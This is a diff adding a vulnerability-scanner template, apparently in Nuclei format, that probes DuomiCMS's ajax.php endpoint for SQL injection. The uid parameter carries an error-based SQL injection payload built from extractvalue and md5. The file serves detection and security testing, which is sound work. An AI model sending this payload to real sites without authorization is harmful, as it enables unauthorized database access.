@@ -1,0 +1,21 @@
+id: poc-yaml-duomicms-sqli
+
+info:
+  name: poc-yaml-duomicms-sqli
+  author: hanxiansheng26(https://github.com/hanxiansheng26)
+  severity: high
+  tags: xray-converted,sqli,ct-158292
+  reference:
+    - https://xz.aliyun.com/t/2828
+
+http:
+  - raw:
+      - |
+        GET /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{rand_int(1000, 9999)}}))) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
